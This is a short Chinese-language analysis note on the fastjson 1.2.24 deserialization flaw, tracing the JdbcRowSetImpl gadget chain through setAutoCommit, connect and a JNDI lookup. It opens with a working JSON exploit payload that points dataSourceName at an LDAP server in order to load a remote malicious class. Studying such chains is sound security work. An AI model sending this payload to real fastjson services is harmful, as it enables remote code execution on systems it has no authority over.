# fastjson 1.2.24 JdbcRowSetImpl链利用

```payload
{
"@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"ldap://127.0.0.1:1389/t9quin",
"autoCommit":true
}
```

## JdbcRowSetImpl利用链

在JdbcRowSetImpl.java中，通过**setAutoCommit**方法调用**connect**方法

<img src="image-20220607113648020.png" alt="image-20220607113648020" style="zoom:70%;" />

在connect方法中，调用了lookup函数，从而触发jndi注入远程加载恶意类。

<img src="image-20220607114034657.png" alt="image-20220607114034657" style="zoom:70%;" />

## fastjson触发利用链

在parse函数中调用parseObject，parseObject主要做字符串处理，在识别到**@type**字符串后，对其值执行**loadclass**操作，从而生成JdbcRowSetImpl类

![image-20220607115545905](image-20220607115545905.png)

随后通过反序列化函数deserialze调用setAutoCommit方法来触发connect方法以此触发lookup达成jndi注入

>  fastjson 将 JSON 字符串反序列化到指定的 Java 类时，会调用目标类的 getter、setter 等方法。

![image-20220607122028770](image-20220607122028770.png)